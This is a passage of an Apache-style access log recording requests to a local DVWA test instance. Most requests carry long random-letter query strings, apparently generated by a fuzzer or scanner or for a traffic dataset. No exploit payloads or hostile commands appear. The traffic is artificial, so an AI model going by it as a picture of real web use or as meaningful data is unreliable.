dXufMlxRPDaFhELSsOORXknKAOTtfLSsjIvuIADkyLhGg HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:45 +0000] "GET /docs/?query=McOSTCkTJkPQeuoKhdhtePvyKBYrKxVgIonMSrcZNjWcJIhfdqGexiLjjGgrRSUyjKbWSJAtrBhtFpexdfJddXCKQvdaOWhVGpdMAZxVYFVxaapwPPMpbbxlnoRwptZUOZwtbAkunEqPIvgZnsVWdlRxGnaeYqSvxXumAoGUPEJpOfUounBRNfDPBTKtBWMUhAOBehitCRknSapEwcxvMusZaCPZyPLDMiwLghnmcZsQIDDfobshPULatsPyDjKZriYwiLJEHSPTDBdohvxLuDMdrqlsQsreuvKTOoprROpqBinADDmvuafQyyhUBoGwCInXaPEyVwBEqYPlAxtTgIajqBlrbXnnUmkyjdQNKuSnJPNApJpKgRrIBsKeiGCeSDvbeasePpTfayqiINTwqfvGlAgfWBFelqRBkJgOllMgrNcCEdaRDQCaMBaYvJyfpaRnHaQSuXEENkHdbwdHyhACifGvfpmqXvBhRrohDrEUfYYYcpcfSfFoITvUQsLRfvKyYcZAceiNCxpJcEehIamgXMClCUOSSjBVkmMgwVhgwjNteWnFgEtqxJqbxGvgENNYhyQpbrrwrZxJfcVSToNwccPTxvOmCjhIDcrCCtqQhWtBMQEDdIKjUvOXKFBePtXQHhdXlhcxUiPGJKtFbEIBJuPfGJHIdtBEavfmykReKGonreJZjlojXWoYKbQffTRbnIWcDEHdWhDqVnLcRaiBkuGyaepXLWAhZFpgygaVDXWudnrWvqOBODYqVyfvbqUsCwRhfqnshXxJbpjsvqVFCxFPYFnbKiTMkhGyPkAgIbNNHehGjmrRqOoUPreQWwKRMjymHavNrISpMlfTyeGgCBRoPskTTopUDRuHHPVFEHYuScaaRovaRHYSrHEXyydNeMQDmGFVdqJaWNrevHOxLrsFiBccGGiIDGxGHluUloiUkZMnVYmGRVDfnYrIaSRWMeSTFYPVDGIeeRZPepXskgYIXnbyHsZZahRJuEcOLoCegJqYSMPwfCKIkrwFWFMKuLMeXbtBSvbhKjmfZIMKNEyBpPWsKRsovnqOrRDVGurFpHCqfDXTPknyDoGJtXqnNwfnfiYskSvhhiUHECrOFOVHtLiXFeOCXqXpGYDkJmmbBJjTcTEIOKAFBQvuJZSYEnxWDhUbMevTRQyBmBRZcSksidjFPVaCpjJtuqXKDBCfRUiDgWvAuCSNJfQefSGpAtuByFHtdYwBVVZEojeWFwqILryuGsThfvbYilGwbJNwTyZZFniuCaSFOTViHJjyMGBoXSJrxoXeYuWLqOpFALBcMswqNDQaVrmZgxHeXCKkroIRHDRGdYPkgIBFucIjGEuTxyCueSOUfOwqiHBZFshrXSvVAVNoHnHjiOhZANDmgHhqDQKMBcrAXaLDuvyfghtEgJtYijcPfpTnNRIZZFVKLQWMGWEgnSkpwAxActpXgxqMsBvuGFtrAGhHYqdZWTgnguPyYUDPUCfKfOLaOWDeDVqOPAEUiJrlDToiJimZIgSZDJupuHcCkEFNQBQmNfhowrGuRrWPyqDmeIBNoTrYidkljyBDtFBsIbRTEdmUiHwGhndekcsmgMIRYDsNitApNnQwwVYcwFpLoFXBQRLMtPqdpYajQTHhGInkqbZBEFASnRftaHnNotkgFSZpnnyMBVmPBNxouWlTPsVmqJQreXNRCGsZsHepYSZSOQpKULqvPNixLRiVJXvWIcaqlAkGwGkpIhjtgCNafWttYPNxlNkfTgXosVgdhDZutJHSvyvMsTyeSZMJcGBxoyLgVsdZKDuNCCGFaMSSBXJPUihQirUdrhyRhYxenQbeUmCFkFnPJypThdFweDsvmswjphYVeAndUtXUHVKQEOACxZUZEcuZvStdcjQTRZqpkLGBHRHqIgVwcVwVVsnNmtOqJvSjGtEOflogaXIDdyeOSyCmRjgpaBsbljsqbRGjllJTOHhinOKexraDpvYgwnYeKrtsBvMNqDXUgsxNaULSxpxYQWtbJtQAVjILHmedhTXihsmJGNAEvUnlfxijyclBdjOmTPduwpskcQoKhurhLwNMwUsiPPiMChJktwjqDjperrhi HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:46 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:46 +0000] "GET /dvwa?query=vnZhyIbyBbUnTawnStCJhcKrJoCqqWLnIplnRVxIptKkNSEfcicJqNUTjNitADmXsibIMSwXtwDakSiyWChAklkCvHMoaTjxUwmSkvsJHUQsPMUtHhRptFSwJaVmLuQSIKyXpNxgIhlKPvUpsOrTIgARgvceGYBmssvwkTgBYnyeCRYyTobGgGhiaeQSGleATHDjpwwQJmkXYmkmJcVGOmToIWSEesrPvshHBTZNJBEtjvNeQcbcyEQnfoPouVgWCxIVaEKZqsnqQRZgDxpgsemMSVLFsbwGmlSEiyRAikTgtTpBDZLLTdKDQIUhMbJbLSrZyQNpSjmjVeZoqNJJUJLStiNicGEpgglnsXXjTjPKGwsrInbgBvCaGPKnTtkbpIcbLiFvPtOIeTmJsfCyNCnfnZZNDdNEPwQxiparsYwhxEHgIgVJZLqUJExXPpRdkIoCunpujXsNQPtthQrwsJbYtkwkHYWglAcxpgsLHNWXXnLmvPnPtLFALlkOtTComXhltlEYkvkxXAXTYFrFLGMUwLipQLUpOdhqJJnTcsWQNynhtbURGNgttLbcjdaWriBBrblZpYAOHHifhBdFWPhDTdJsuhMcjKeGrOESTRQotQXGRYVCBrQNtwMtHSYGeHLCHeQlAnLcXyncqCsvmlZoxwrtDlqIvOxfQbuUxdRdsdjbHclBKTCGhnHgdFrYAhUHAimZYZITKAZHcCPfSUUowyNGQThjSoEKmXQENCfCYbNwKTjfUYevnyGrlfKnJnHItvIIifbIVrIlTpujKtwbnyCjlQqgkMCbvuTEyNyOhQWAOZNEacWVpIpLgqIyfAgOZroBuYaSpwgFjTHUAeUDetmdvAKYoMtuvlIxaPtlfqPFvnOlUUZTOnEuUGGMXdLdlYgTxQabDxMgWTyVeVWenwPWNaZLByGhKGNTrfJXCJvDQwZMtWsnWWaGSTbRFGpqdqDJVhfxTfqafkgytaHYIxSclJOecRIZdgNSOENiIWisaVIQEOfdSHOLNZbEeNUkoImheWynMsPJOhxIOxDDLKtyTbFIJUVHRYXrRUgpvHUXQqqVxQHUDQoQfFyPUdQwLRysWSugAmeAWyLJJFsDcqMUqyaEQNoXvaulSPnVhlnvZFsSqAyIndJAFfHHkgpuDEPXtjFQHhPhvtTHAAnwZvhoWnayFbgZcMZtTmcbpgKfoCCZidiYyKsOBcGIrZyMAOUVPikiGXMwmuJGjiZCjHojplWZkwOZtdqRSPHAmYJyahjiuZwGhbCnRndwZxHyqjsYVeYYqQNcNbfKCvjsrfXPtlsAXoBRbaTvDYipdPHOxLlGZJvpGeRbHvREOrfTGjfIRkWMnwJcXbowWgNwYGRWDDkevBBIlqJOHnGtQlRkqxftgUcPwvBSMIawLkTcOnUXgcPgeSjuKxSVvGsqjrVkVXxEswrZSxnWRHuaDsjGgMCetIrPmGWnMxQbdUSvnaQCyDExjIIEGrOQUhemqTQBWVMVgaHvhdooJfktOfJKIimNhbjsRYRaXAdRGAqXbjLfNqluapsvyOMpbNpaNquWsEvqmpjfiaDrJcjLofHZuCmutVPwFOLeiKbxOxofsDGCoNeoCiBtkcADCHEQHarwUDymcsSOHbinRVOZuYqcmgAyPCUDKhirdAXBdakVfcyFLdqTnFLZNuHUHcsTCTCIcqHkMCujsAdmXfVcieiKxRMFZrpNlBqbASKQSPNHbkjXoooKZhSZWjbjcoewvVbqvWdvXZUhepnPbpVvjKFtIqumUtbGHjFauscUFLlnRguELRkUQsoUpMpNKGXueBgLnFCrMIlcZWuMRoEGpbdhuaAclEdHtLbUFoNtFyfJTPHeDkcUvZeSMmaKxLXbDFNyVtTthCviZjDbrZnDEIBYEfGRDikTtjDBPKyDNbgyrhlmaYCffnVjRCJcWgVAHyWWBOalSCRPeoQanYcpWHdCvqGdJqtonhBjDWPJdgdNNyYAZuNkpxMRisPOvgpcFcQwBQyxtBCCQZTAcXThPGAbQfqIInQLlcLOyHUygGMlhdEiEwMsntURLYkRbqOdmbPIKScnuSqmOFKeRsUXTMyuALyo HTTP/1.1" 301 4735 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:46 +0000] "GET /dvwa/?query=vnZhyIbyBbUnTawnStCJhcKrJoCqqWLnIplnRVxIptKkNSEfcicJqNUTjNitADmXsibIMSwXtwDakSiyWChAklkCvHMoaTjxUwmSkvsJHUQsPMUtHhRptFSwJaVmLuQSIKyXpNxgIhlKPvUpsOrTIgARgvceGYBmssvwkTgBYnyeCRYyTobGgGhiaeQSGleATHDjpwwQJmkXYmkmJcVGOmToIWSEesrPvshHBTZNJBEtjvNeQcbcyEQnfoPouVgWCxIVaEKZqsnqQRZgDxpgsemMSVLFsbwGmlSEiyRAikTgtTpBDZLLTdKDQIUhMbJbLSrZyQNpSjmjVeZoqNJJUJLStiNicGEpgglnsXXjTjPKGwsrInbgBvCaGPKnTtkbpIcbLiFvPtOIeTmJsfCyNCnfnZZNDdNEPwQxiparsYwhxEHgIgVJZLqUJExXPpRdkIoCunpujXsNQPtthQrwsJbYtkwkHYWglAcxpgsLHNWXXnLmvPnPtLFALlkOtTComXhltlEYkvkxXAXTYFrFLGMUwLipQLUpOdhqJJnTcsWQNynhtbURGNgttLbcjdaWriBBrblZpYAOHHifhBdFWPhDTdJsuhMcjKeGrOESTRQotQXGRYVCBrQNtwMtHSYGeHLCHeQlAnLcXyncqCsvmlZoxwrtDlqIvOxfQbuUxdRdsdjbHclBKTCGhnHgdFrYAhUHAimZYZITKAZHcCPfSUUowyNGQThjSoEKmXQENCfCYbNwKTjfUYevnyGrlfKnJnHItvIIifbIVrIlTpujKtwbnyCjlQqgkMCbvuTEyNyOhQWAOZNEacWVpIpLgqIyfAgOZroBuYaSpwgFjTHUAeUDetmdvAKYoMtuvlIxaPtlfqPFvnOlUUZTOnEuUGGMXdLdlYgTxQabDxMgWTyVeVWenwPWNaZLByGhKGNTrfJXCJvDQwZMtWsnWWaGSTbRFGpqdqDJVhfxTfqafkgytaHYIxSclJOecRIZdgNSOENiIWisaVIQEOfdSHOLNZbEeNUkoImheWynMsPJOhxIOxDDLKtyTbFIJUVHRYXrRUgpvHUXQqqVxQHUDQoQfFyPUdQwLRysWSugAmeAWyLJJFsDcqMUqyaEQNoXvaulSPnVhlnvZFsSqAyIndJAFfHHkgpuDEPXtjFQHhPhvtTHAAnwZvhoWnayFbgZcMZtTmcbpgKfoCCZidiYyKsOBcGIrZyMAOUVPikiGXMwmuJGjiZCjHojplWZkwOZtdqRSPHAmYJyahjiuZwGhbCnRndwZxHyqjsYVeYYqQNcNbfKCvjsrfXPtlsAXoBRbaTvDYipdPHOxLlGZJvpGeRbHvREOrfTGjfIRkWMnwJcXbowWgNwYGRWDDkevBBIlqJOHnGtQlRkqxftgUcPwvBSMIawLkTcOnUXgcPgeSjuKxSVvGsqjrVkVXxEswrZSxnWRHuaDsjGgMCetIrPmGWnMxQbdUSvnaQCyDExjIIEGrOQUhemqTQBWVMVgaHvhdooJfktOfJKIimNhbjsRYRaXAdRGAqXbjLfNqluapsvyOMpbNpaNquWsEvqmpjfiaDrJcjLofHZuCmutVPwFOLeiKbxOxofsDGCoNeoCiBtkcADCHEQHarwUDymcsSOHbinRVOZuYqcmgAyPCUDKhirdAXBdakVfcyFLdqTnFLZNuHUHcsTCTCIcqHkMCujsAdmXfVcieiKxRMFZrpNlBqbASKQSPNHbkjXoooKZhSZWjbjcoewvVbqvWdvXZUhepnPbpVvjKFtIqumUtbGHjFauscUFLlnRguELRkUQsoUpMpNKGXueBgLnFCrMIlcZWuMRoEGpbdhuaAclEdHtLbUFoNtFyfJTPHeDkcUvZeSMmaKxLXbDFNyVtTthCviZjDbrZnDEIBYEfGRDikTtjDBPKyDNbgyrhlmaYCffnVjRCJcWgVAHyWWBOalSCRPeoQanYcpWHdCvqGdJqtonhBjDWPJdgdNNyYAZuNkpxMRisPOvgpcFcQwBQyxtBCCQZTAcXThPGAbQfqIInQLlcLOyHUygGMlhdEiEwMsntURLYkRbqOdmbPIKScnuSqmOFKeRsUXTMyuALyo HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:46 +0000] "GET /dvwa/css?query=UGXbkmpDIEBkrRNEQCrrkiJXMDjkqHldkQbsfTOSOvhqFpSbcLdevaDLQrGhPpgnOjescKLDaotBHHgTAsqruDcrppwFbppKswEbKwEKhmCICHNBrjomwdrvXrvtOgudNgZWOFYxrfrNFLQYxgVoUkVJYnerNyJUpCQJjyIdkfyLgHTgcEtexSuZtkpoapKjLASGJqllHZCwRrhVpRslPbhJCbhVtNyFERapAXOYQeBAVbtTobQUeXvIBjQpEIJtHDiulvZNYKDNwFklsbWYGToqsjLwmpaxavCDIKZWrlpQsRRHWyCIWhlNsrdyPTLUUGhQbFdjSBJdsQEEmBSHKujtOAEoQtjUphpVFWqRSfTKDkWVKRlDUqhWSuIFXLnSZexdeAvLipnyYYiBjGmKXdmmNtkTwRwDxcyBXcrrLcmTPpZDkOUlPaFooSxTQqdbwAllQiUnDnJjMFYrOOEioovleJcWBJXgprcNBoigQbqJIVssKsJbQaZUMIumuKZsxdxxQkjwWBNMufhGCkEtbjTalMkeryBbBSTKiFpoIdXPWuCUdvNVJxuiLQbuxkWdhUSfvGhhgXPrCqnXeOMMRUnLvQypRpeVrfcdyyBolhXtBePySXBgMQAPXUUssSUSfrYXHRmnLKwEKvoUZVYRFRprCvKJnYofJnqchmUnTnxTmpPNCqeIgyPSXOfohaGuXEFfRlehlRMdBNetErimnqosbvssHFjmEgUvUFUroOaZUvuGQTJwmRdaGfrTGJeuuGIJSBXCtOBhLMOKEcamBvCFTQKovCRgZsavLOhubMbDnHgkNjwCEwfTIjJxktvLKiOmGdASdNUPtiaIDoyDpUVRRURXkIKFQmXKxdKHwqBjJgZUCewnrXTquQVmZeLdGdjsGtbtRbAJFoKGQmhPVSGmogQSPJWjEqOKfLESBlJPXdxdACEyClBobwKqYrhiiumMhJnfNRRpGGCwcwHbYPWgZxWZPkmDTXNcptmeHmaITfLSceGytSEehePhYpnFoYlUnrlrSnvnfxlNbMaqfrwucXuMBgEAKIEFsRpjdVwKrXMHjrWkGmnOocfiELEacudvlviYvmYChdugXXIHnLfcNpHlTdLSuWMDOXSUZkrERZiTETvWWXUZmHrBDTAiFQvBWdlaBFWZnncFqrEjYytrTbXupUlVQlKeNcijrTrKxHaoNbkarvcgxRLdeioNRDOumBIhCyksGEMCAXWhHQQPDWAUaMKrhenZoLoTiErKwRKFQdGRhHwXVASpfHJJwVXwoxhXrFMJEQVfRBjBKSbPiSlSDfNllybkiaWSiaUmFiYIKeOZUOhLipjUSROEvRHmSUtPPgeEMfquhNdAxLpLrpDedQfBuVMlNsWEyGIrfShQJTXxHgYOiLEmCymcvgiXCHVsqYJbZreeDaNsHOHengumdpeMQiwrjTCZHGXALBHRIVAuGSkmhmfCUnErqcDGmgUTJpSXaUvuNgeowmvouawHthQmBXYqWIZEINQKGceSTPoeaKGJOpuMcoiPaNBvKDOVDpdobsBQVYMgKtxitDVsDxmGdjoRVYKXoMdPIOcxejiKLRbfnltTJtUJnBLGNmAikQRToEFTrlxaasaUJUXpbgURCtYwoaysQLuvxtLqGZLKgVeRGbrhUlXYfTfcoEcuryHpsSpNUquixGMJQjdNcrRqAjAFsjEoYvBHQKEusJkgvNdscJMcgHCGAdVRMsZgRvtlfEmVtkKrdhGrPqESwWKSiKyQpbIfXNVxjbeIKBjLPgtJrTOiXYcgxpHMffpyGodfXhEunIsqOQqRoHvRNQcPJuXoCYMuWeNkTwbbBTgxGBuqYrYZjPKTnubbBeGwdAwXtPpmlvfqILIfTXMJjPhmEtXlplCvEatEVsnxutDHcvITpKsVPnWUHOCnpabDKOTAyWCyCyxKQlljxpqxtBlBNVUjVuSYniohTglWsYKPAVtfLXGtkwemWjjdLIdLFLOPtKCQwbcJBbAZoHXgBHZNJCfmSEjbcyeEcqoGxmAKuucEMnUIUqudRJIHUBNZusaZkcBFTJhPAVODFnfkuLOEvTnHTSEQDcdHrhAJKMks HTTP/1.1" 301 4743 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:46 +0000] "GET /dvwa/css/?query=UGXbkmpDIEBkrRNEQCrrkiJXMDjkqHldkQbsfTOSOvhqFpSbcLdevaDLQrGhPpgnOjescKLDaotBHHgTAsqruDcrppwFbppKswEbKwEKhmCICHNBrjomwdrvXrvtOgudNgZWOFYxrfrNFLQYxgVoUkVJYnerNyJUpCQJjyIdkfyLgHTgcEtexSuZtkpoapKjLASGJqllHZCwRrhVpRslPbhJCbhVtNyFERapAXOYQeBAVbtTobQUeXvIBjQpEIJtHDiulvZNYKDNwFklsbWYGToqsjLwmpaxavCDIKZWrlpQsRRHWyCIWhlNsrdyPTLUUGhQbFdjSBJdsQEEmBSHKujtOAEoQtjUphpVFWqRSfTKDkWVKRlDUqhWSuIFXLnSZexdeAvLipnyYYiBjGmKXdmmNtkTwRwDxcyBXcrrLcmTPpZDkOUlPaFooSxTQqdbwAllQiUnDnJjMFYrOOEioovleJcWBJXgprcNBoigQbqJIVssKsJbQaZUMIumuKZsxdxxQkjwWBNMufhGCkEtbjTalMkeryBbBSTKiFpoIdXPWuCUdvNVJxuiLQbuxkWdhUSfvGhhgXPrCqnXeOMMRUnLvQypRpeVrfcdyyBolhXtBePySXBgMQAPXUUssSUSfrYXHRmnLKwEKvoUZVYRFRprCvKJnYofJnqchmUnTnxTmpPNCqeIgyPSXOfohaGuXEFfRlehlRMdBNetErimnqosbvssHFjmEgUvUFUroOaZUvuGQTJwmRdaGfrTGJeuuGIJSBXCtOBhLMOKEcamBvCFTQKovCRgZsavLOhubMbDnHgkNjwCEwfTIjJxktvLKiOmGdASdNUPtiaIDoyDpUVRRURXkIKFQmXKxdKHwqBjJgZUCewnrXTquQVmZeLdGdjsGtbtRbAJFoKGQmhPVSGmogQSPJWjEqOKfLESBlJPXdxdACEyClBobwKqYrhiiumMhJnfNRRpGGCwcwHbYPWgZxWZPkmDTXNcptmeHmaITfLSceGytSEehePhYpnFoYlUnrlrSnvnfxlNbMaqfrwucXuMBgEAKIEFsRpjdVwKrXMHjrWkGmnOocfiELEacudvlviYvmYChdugXXIHnLfcNpHlTdLSuWMDOXSUZkrERZiTETvWWXUZmHrBDTAiFQvBWdlaBFWZnncFqrEjYytrTbXupUlVQlKeNcijrTrKxHaoNbkarvcgxRLdeioNRDOumBIhCyksGEMCAXWhHQQPDWAUaMKrhenZoLoTiErKwRKFQdGRhHwXVASpfHJJwVXwoxhXrFMJEQVfRBjBKSbPiSlSDfNllybkiaWSiaUmFiYIKeOZUOhLipjUSROEvRHmSUtPPgeEMfquhNdAxLpLrpDedQfBuVMlNsWEyGIrfShQJTXxHgYOiLEmCymcvgiXCHVsqYJbZreeDaNsHOHengumdpeMQiwrjTCZHGXALBHRIVAuGSkmhmfCUnErqcDGmgUTJpSXaUvuNgeowmvouawHthQmBXYqWIZEINQKGceSTPoeaKGJOpuMcoiPaNBvKDOVDpdobsBQVYMgKtxitDVsDxmGdjoRVYKXoMdPIOcxejiKLRbfnltTJtUJnBLGNmAikQRToEFTrlxaasaUJUXpbgURCtYwoaysQLuvxtLqGZLKgVeRGbrhUlXYfTfcoEcuryHpsSpNUquixGMJQjdNcrRqAjAFsjEoYvBHQKEusJkgvNdscJMcgHCGAdVRMsZgRvtlfEmVtkKrdhGrPqESwWKSiKyQpbIfXNVxjbeIKBjLPgtJrTOiXYcgxpHMffpyGodfXhEunIsqOQqRoHvRNQcPJuXoCYMuWeNkTwbbBTgxGBuqYrYZjPKTnubbBeGwdAwXtPpmlvfqILIfTXMJjPhmEtXlplCvEatEVsnxutDHcvITpKsVPnWUHOCnpabDKOTAyWCyCyxKQlljxpqxtBlBNVUjVuSYniohTglWsYKPAVtfLXGtkwemWjjdLIdLFLOPtKCQwbcJBbAZoHXgBHZNJCfmSEjbcyeEcqoGxmAKuucEMnUIUqudRJIHUBNZusaZkcBFTJhPAVODFnfkuLOEvTnHTSEQDcdHrhAJKMks HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:46 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:46 +0000] "GET /dvwa/css/login.css?query=CduEfTMBwxqayZjRMseMrYnJIGGXXpShCNhXKbcLnoymHhtVfHQCaWpnFKgYQFMjEPxdciLrkRZqnPDVNtADIMjDttFtSPdnblkGhEkUsEWsGUqvLbOxNLRhAeMYtvBjNTueqelSjeLHSGlYdbpTGwmiryQHkgMJJyITbRqmgfggxXOgiyLURxvhKrFHoQbEJdOXkKbKuUEWbyCBYYRehTamWRkrlCYdBdCkPVhYxdfWLmLmbrNORnvoJSuvNMGvxlfgApXZYXjyuAUJPCulxBqsJSiGEpqRttFBKesqwLqxvpTepJutRHKEcUvELrqWuDilVLOaORfjoQmmQCgTySuTVtHZaugCeHBfOqZJmCuECaYBlmmYsYiZFCWqvFcjTPhUKCuInDxEvtvDiUvXeZCPcCAaFnUYtvkhFRjPyxHRrUKupSWLTKsUXEiLySjjWVwVLxWRcPsQPPLoqihWChWhSkxiydLaVvGMqCvCkCoxyJyWYagZaDFiEsUkEowxlDRuFRyeZkNsMTJbeERPsvkOjfXQCPssuGxHJDHKaRlSgcGSMgYYsHrOrNClKDwTvmeDCXanaHZFDuWPJPVvaKpdHLbhcuDulWpDKwcUHCnFtFwFUAmVFVIdZcsTLCrOgYhTVGbSIqWsFfYGTIoIakEethmaqppnCIFhmiPEZqNZUEnCRNQJFOeJDtYvRnLhPbUtiucUxqRRuKRvehFslyafMskNklJPqlCKTPkytwZNcJbTonDDfGejLIXkXAsmUQfsCcaVaTJaLpqlYGPRricuWIysNJQppDdsCHqGlDvHpICmIwLspwDxgNUNBFtFQLXoiDfdnfrOTyhxWaWpSBKhByIKQOFqmVUNFtGaMkwidqnViYQuHTyhpjLwNVvsAmThgGMjsyKSKQcRiGqveRBhMeXHXGyBxNTYTQBhdmfPMMjPkMYDgMnlbYDtgOrBMCiXJHtvyuYtyLnqSQRNVGMMoSScmvsnHKrVtsLygogbdmcvHKGrBXxvuMgALrmtwANALOsFZVGahtweRFBDeErZECjwusgnAJpgxJqUbipmRFUEvsvSrvAFsTTlmKpkyphfWQvGsMRMvGNBMHtqqYAeOkMykyhPhwALjoJdFqvZyMieSZldCbxgPMkLqSimodlaTUkIPiKainiQIBJUEcYZwCCUQkRbxIprAUWFbqvQkXnwYErNstnSVeBAMYHwhfHkTHacfOYynPRVKHrxrIQBLkpbVQjMZHosnqcEkDxONZxUwRkEdWrVAYQUBIJhEHKXMRXiKtZwchZDHSWJAaXLelJmKyBaRngjetJOpjWpFqXaqlASElouuOLvcKBhDVXWQbPevanUkTeHBWdoxHyBLvKZHtvjoFZaQkjmtyGUwwQVGrRalEaNmAFEgXqMXGxhnORjvogOrNFpywhDOSimPXpGcJPvtHjvXfBmtRmKBtWCQpdHjbKSDccjHpqKHnqYSqhOwpYDEIVcauwvkiIMXTRRADyKpJPZPxqAkaRuKqsDTcAVhEyZhoeNVxjqkSuCYLpMjjHqKrEmhjtQBxhtOtVDdkSxMBPgnfcipGOpWkSBDagJvsrbhxhAdgpiBeIiAGfyVnSVdPvhdUUAmapRmcjZpetkyJAKUWGvBnCZMbawRirIJkBmiNmKXXrJvqrZDaZZXHhqTcgycjbBDBfCXRYEbunvttMckvLwcdPBPTmEwDSeiXUilFOOjuiMTIIDwqwCOsfLkaOejbsNlowhpYyEQVtLvZGaETUaEaUuVnmTmBhuFytgvcsfqSwKhWrbtLcpASiLQvyAbTODAealLatFCOAvDCOSBQMAKcDrghvohwHAITRrsDlQpVthmEarIaCNrTDiOrQilDuhqDmTugPsORuiciRlepHSFoiXOTmZjxfoNYmtBtMOaHgWMddglcuvyALQRfajRCZCkEPCVpPfKEhhSYxNxGNjXAwoGbyxQoquRpUvuMMuBcgoSGFqxcxJgSXdLAdYjJcLkEByaYqTxLwmGwvCcKusNZXdfBmVnmxXiKaiJDEcEuZdDYabPhEFfOyhQZQbKHflIYuwcjgiaZIvGgwJFqLqPEjOfrpBHYuM HTTP/1.1" 200 1093 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:46 +0000] "GET /dvwa/css/main.css?query=eyOCtdYWXsimySuBCbHUsdxeMuGcamtPDshmJUjqOXXyahgNyNbnOqUatvitmrNvRrTjPxGZOptCmVZoCUFdrLrKFbddEQDBMHZGYfqpCMIuqALnfPqasincWHQeGfgjgQcsOpLGXeOwlPlYislRluDlRHsOAexecUPDsUAJsRiqWdHVqtdXDhSJnkvYcfYJVGmvMWleGXjMVWFEvXIxyIBiLlsRcFGDHvKEwwyqyVHXeJoAKkvtDUELOnPkrSHrdIxuACWRqFRDdHHKPRpbCysqJIQBaNEJperHfiAMDmaYVeejcwESpnreaypVusWlHdeDaMnGpdiiPFGkPpDjJTBXbhJLNATokKYmeCrmslVxJHEoLoNSboGHpoFTNaMebPXnDeeLZnSeQCbIGpFVwAicNoJarexYgkWwbuTErMGaYyuhKgIUAbjdyJmZIWkwSrwYamHgvPxfNwpGrQYHenkNUKTKxpSfGbvFvkBYymiqabUfsrLmXEEDpflQmTZsLxfNiRgGDTfmcQqYyKXDdNnbLZDsROElHckhDQxXidVNrOlFcIsOTmZuLIosCoSWwZiWwLaYtOtRbAljcIaKlnAuKbeQyNLNdBrKVtKmYplrWksReRxgCCVJueBpMWmkxNyLtmWPtuLQDHqssnHPGvLttMRnRceujYwvKVTTvtRlbIxDRlZFtmELdCJPeSYjWaHQmrjOsbiEQSSdAraGxaJmbtTOBpVXLIqVRyGjdExYcmSOZRFWZStCkBjPLXvrHPZmMZfhtrlMFCDnAtBifxouAfAVhEAXbWkYHqeAehSrZJcBITPJpPheTkmmuWPgpefPYDvHvuRNWvapWABFFfKLDJSjtMEWNiGcfhdjlQCXWJFQFUAbHJrFAouvUTiUkHtHrlLAZhmWwBNatoeCfQmuqwasMXpEQpIswgppWRnAFtrRnIhTZRoTNecUpVpEdutQifADpKjDUkvOhMROoQxvEewnTQOcWnEmoXojuDOpILqEWjHJRcLnpyfHgRpmYfPtZcCynqQGZGIDpsGUPWtuNMGWpkyHftqaBlfrWoxpijhxYsSeOtiCAtGtpNKrowRuoOvUhaVwKoufOnnVXHAXwyBXmefpgqXqfZyBUxnijILEZIuXVtoQMIcyEOGCgRWKGeLVeciwDiMDguQwaDkZbcqKuFBlPWrnNMxfvSCFQEAcXUyViQcrRVVmvXdIxEkZaDgtAGlLagAWWEbsDaypfuwulEZkULZLXWmcpPhLdwSrrwmRfFmbnNAoCJnDHmvuRSaPlYyupJRbHoxxIvxJHhIOoReYuZKgTeFelvHUJHyXXvZVgBMJhjFcAjtryLTGwkgmfqYxLQnlMIIlUuTUcPLODTwilFQeVnMdFQEFVqbZBrwpbYeQfcGjHwmRRkKfaKdRsnxRARtKHTbOsVxXuZFJCYesibkwJaYKjPHuREXNyucgDdgUAVsBKIBPIiTutjbtQJripVOXIwvapIuvKnIcsbNWTEdOcZHORxwFWNVfWGXltngneUhIUMqBGafUrtNXqNEPgkoEiiqLPRRemrsFIETOiPhlDQLDATVNBmFGimVSZpbSqgoplamssJniJXVllnTZwKkosHPccvPqDqFqCEUcZFEwLlXFZtAplibKgwjjBYUBuBLsEEygbKSSUCpwIoOaRkHEcPniFGxyIbgcBmFXnoSArXSqquMQEfScuXlQlaNbXxDHlHiaLdSggBYNtZOGnnhMtbEVNcxqlWScMqgMHvFWTbTglJjvgFfxoXARvxeturOkedJyOeJanJeCZijKaimlNFqXkkOTFuWigfiRFjtDYXBNEeELQQkmCdrsPOBsZMDwOatdgZJDJuvCAFTnPfrwYxOHgPQTYQQGDIFuGTvWGWHTXIbnvohjncZaXQPGdPCMycegKWmwvsyekxwyalmTwDtXoWyNEEcCRjsmYeBKLrasRQDEryJdtaUOOimDYPEBaVMsSyohrNhBcUXdlItvoduNtwNUyLuraXXYORgIYdhIUGwFygeFSPqTsdjkPiBIBicrIECapJwRqtxUxVaouJXQipGuVHRmesHeIRRYroisDinrruAyIsSu HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
